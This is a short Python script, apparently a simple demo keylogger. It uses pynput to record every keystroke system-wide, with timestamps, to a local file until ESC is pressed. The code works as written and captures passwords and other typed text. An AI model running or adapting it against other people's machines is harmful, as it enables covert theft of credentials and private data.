from pynput import keyboard
import datetime
import os

logFile = "keylog.txt"
timestampFormat = "%d-%m-%Y %H:%M:%S"

def getTimestamp():
    return datetime.datetime.now().strftime(timestampFormat)

def onPress(key):
    try:
        with open(logFile, "a") as f:
            f.write(f"{getTimestamp()} - Key pressed: {key.char}\n")
    except AttributeError:
        with open(logFile, "a") as f:
            f.write(f"{getTimestamp()} - Special key pressed: {key}\n")

    if key == keyboard.Key.esc:
        print("\nKeylogger stopped by pressing ESC.")
        return False

def main():
    print("Simple Keylogger")
    print("Starting keylogger......")
    print("Press ESC to stop the keylogger.")
    
    if not os.path.exists(logFile):
        with open(logFile, "w") as f:
            f.write(f"Keylogger started at {getTimestamp()}\n")

    try:
        listener = keyboard.Listener(on_press=onPress)
        listener.start()
        userInput = input("Enter text: ")
        print(f"You entered: {userInput}")
        listener.join()

    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
